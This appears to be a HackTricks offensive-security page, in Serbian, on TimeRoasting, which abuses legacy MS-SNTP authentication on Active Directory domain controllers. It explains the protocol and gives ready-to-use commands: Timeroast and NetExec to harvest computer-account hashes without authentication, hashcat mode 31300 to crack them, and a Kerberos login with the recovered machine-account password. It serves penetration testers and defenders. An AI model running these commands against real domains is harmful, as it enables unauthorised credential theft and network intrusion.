# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting zloupotrebljava legacy MS-SNTP authentication. Neautentifikovani klijent može da pošalje zahtev od 68 bajtova koji sadrži izabrani RID computer account-a. Za exploitable legacy putanju, domain controller izvodi response authenticator preko Netlogon-a koristeći NT hash computer account-a (password secret izveden pomoću MD4), čime napadač dobija par challenge/MAC pogodan za offline pogađanje lozinke (Hashcat mode 31300).<sup>[[1]](#references)[[2]](#references)</sup>

Odeljci 3.1.5.1 i 4 specifikacije MS-SNTP opisuju ponašanje zahteva i odgovora:<sup>[[1]](#references)</sup>
![TimeRoasting: Pogledajte odeljak 3.1.5.1 "Authentication Request Behavior" i 4 "Protocol Examples" u zvaničnoj MS-SNTP specifikaciji za detalje](../../images/Pasted%20image%2020250709114508.png)
Kada je `ExtendedAuthenticatorSupported` false, zahtev čuva RID u donjih 31 bitu Key Identifier-a authenticator-a, a selektorski bit u gornjem bitu. Server proverava dužinu od 68 bajtova, izvlači RID, traži od Netlogon-a da izračuna kandidate za checksum, bira jedan koristeći taj gornji bit, postavlja response Key Identifier na nulu i vraća izabrani checksum.<sup>[[1]](#references)</sup>

Crypto-checksum je zasnovan na MD5-u (pogledajte 3.2.5.1.1) i može da se crack-uje offline, što omogućava roasting attack.<sup>[[1]](#references)</sup>

## Kako napasti

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting skripte autora Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Praktični napad (bez autentifikacije) sa NetExec + Hashcat

- NetExec-ov `timeroast` module može da enumeriše RID-ove računara, prikuplja MS-SNTP MAC adrese bez autentifikacije i ispisuje `$sntp-ms$` hash-eve spremne za crackovanje:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline pomoću Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Oporavljeni tekst u čistom obliku odgovara lozinci računarskog naloga. Pokušajte je direktno kao mašinski nalog koristeći Kerberos (-k) kada je NTLM onemogućen:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### Operativne napomene
- Obezbedite tačno vreme pre korišćenja oporavljenih kredencijala sa Kerberos-om. Preferirajte održavani NTP klijent kao što je `chronyd`/`systemd-timesyncd`; `ntpdate` je ovde zadržan kao uobičajena lab komanda: `sudo ntpdate <dc_fqdn>`.
- Ako je potrebno, generišite krb5.conf za AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Kasnije mapirajte RID-ove na principals putem LDAP/BloodHound-a, kada budete imali bilo kakav authenticated foothold.

## References

- [1] [MS-SNTP: Microsoftov jednostavni mrežni protokol za vreme](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – whitepaper o Timeroasting-u](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — izvorni kod `timeroast` modula](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Hashcat režim 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
